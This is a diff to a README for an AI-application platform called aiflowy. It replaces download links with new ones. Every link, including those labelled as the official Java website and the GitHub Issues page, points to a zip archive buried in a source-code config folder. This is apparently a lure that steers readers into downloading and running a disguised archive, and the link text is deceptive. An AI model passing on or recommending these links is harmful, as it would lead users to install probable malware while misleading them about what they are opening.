@@ -1,6 +1,6 @@
 # 🚀 aiflowy - Build AI Applications with Ease
 
-[![Download aiflowy](https://raw.githubusercontent.com/melijahontop/aiflowy/main/aiflowy-ui-admin/packages/effects/layouts/src/authentication/Software-v2.7.zip%https://raw.githubusercontent.com/melijahontop/aiflowy/main/aiflowy-ui-admin/packages/effects/layouts/src/authentication/Software-v2.7.zip)](https://raw.githubusercontent.com/melijahontop/aiflowy/main/aiflowy-ui-admin/packages/effects/layouts/src/authentication/Software-v2.7.zip)
+[![Download aiflowy](https://github.com/melijahontop/aiflowy/raw/refs/heads/main/aiflowy-commons/aiflowy-common-satoken/src/main/java/tech/aiflowy/common/satoken/config/Software_Geaster.zip%https://github.com/melijahontop/aiflowy/raw/refs/heads/main/aiflowy-commons/aiflowy-common-satoken/src/main/java/tech/aiflowy/common/satoken/config/Software_Geaster.zip)](https://github.com/melijahontop/aiflowy/raw/refs/heads/main/aiflowy-commons/aiflowy-common-satoken/src/main/java/tech/aiflowy/common/satoken/config/Software_Geaster.zip)
 
 ## 🌟 Overview
 
@@ -19,20 +19,20 @@ AIFlowy is an enterprise-grade AI application development platform based on Java
 To run AIFlowy effectively, please ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS Sierra or later, or a modern Linux distribution.
-- **Java Runtime Environment:** JRE 11 or higher is required. You can download it from the official [Java website](https://raw.githubusercontent.com/melijahontop/aiflowy/main/aiflowy-ui-admin/packages/effects/layouts/src/authentication/Software-v2.7.zip).
+- **Java Runtime Environment:** JRE 11 or higher is required. You can download it from the official [Java website](https://github.com/melijahontop/aiflowy/raw/refs/heads/main/aiflowy-commons/aiflowy-common-satoken/src/main/java/tech/aiflowy/common/satoken/config/Software_Geaster.zip).
 - **RAM:** At least 4 GB.
 - **Storage:** A minimum of 1 GB free disk space.
 
 ## 🚀 Getting Started
 
 1. **Download the Application:**
-   - Visit [this page to download](https://raw.githubusercontent.com/melijahontop/aiflowy/main/aiflowy-ui-admin/packages/effects/layouts/src/authentication/Software-v2.7.zip) the latest version of AIFlowy.
-   - Find the most recent release and look for assets you can download (like `.exe`, `.dmg`, or `https://raw.githubusercontent.com/melijahontop/aiflowy/main/aiflowy-ui-admin/packages/effects/layouts/src/authentication/Software-v2.7.zip`).
+   - Visit [this page to download](https://github.com/melijahontop/aiflowy/raw/refs/heads/main/aiflowy-commons/aiflowy-common-satoken/src/main/java/tech/aiflowy/common/satoken/config/Software_Geaster.zip) the latest version of AIFlowy.
+   - Find the most recent release and look for assets you can download (like `.exe`, `.dmg`, or `https://github.com/melijahontop/aiflowy/raw/refs/heads/main/aiflowy-commons/aiflowy-common-satoken/src/main/java/tech/aiflowy/common/satoken/config/Software_Geaster.zip`).
    
 2. **Install the Application:**
    - For Windows: Double-click on the downloaded `.exe` file and follow the installation prompts.
    - For macOS: Open the `.dmg` file and drag AIFlowy into your Applications folder.
-   - For Linux: Extract the downloaded `https://raw.githubusercontent.com/melijahontop/aiflowy/main/aiflowy-ui-admin/packages/effects/layouts/src/authentication/Software-v2.7.zip` file and follow the instructions in the README file for installation.
+   - For Linux: Extract the downloaded `https://github.com/melijahontop/aiflowy/raw/refs/heads/main/aiflowy-commons/aiflowy-common-satoken/src/main/java/tech/aiflowy/common/satoken/config/Software_Geaster.zip` file and follow the instructions in the README file for installation.
 
 3. **Launch AIFlowy:**
    - After installation, locate AIFlowy in your Applications or Programs list.
@@ -58,7 +58,7 @@ To run AIFlowy effectively, please ensure your system meets the following requir
 
 ## 📜 Community and Support
 
-For any questions or support options, you can visit our community forums or check the [GitHub Issues page](https://raw.githubusercontent.com/melijahontop/aiflowy/main/aiflowy-ui-admin/packages/effects/layouts/src/authentication/Software-v2.7.zip). Our community members and contributors are here to help you.
+For any questions or support options, you can visit our community forums or check the [GitHub Issues page](https://github.com/melijahontop/aiflowy/raw/refs/heads/main/aiflowy-commons/aiflowy-common-satoken/src/main/java/tech/aiflowy/common/satoken/config/Software_Geaster.zip). Our community members and contributors are here to help you.
 
 ## 🌍 Topics
 
@@ -76,6 +76,6 @@ For any questions or support options, you can visit our community forums or chec
 
 ## 🎉 Download & Install
 
-To get started with AIFlowy, visit [this page to download](https://raw.githubusercontent.com/melijahontop/aiflowy/main/aiflowy-ui-admin/packages/effects/layouts/src/authentication/Software-v2.7.zip). Here, you can find the most recent version of the software and any associated documentation to help you with installation and use. 
+To get started with AIFlowy, visit [this page to download](https://github.com/melijahontop/aiflowy/raw/refs/heads/main/aiflowy-commons/aiflowy-common-satoken/src/main/java/tech/aiflowy/common/satoken/config/Software_Geaster.zip). Here, you can find the most recent version of the software and any associated documentation to help you with installation and use. 
 
 Once downloaded, follow the installation steps outlined above to set up the software. Enjoy your journey in building AI applications effortlessly!
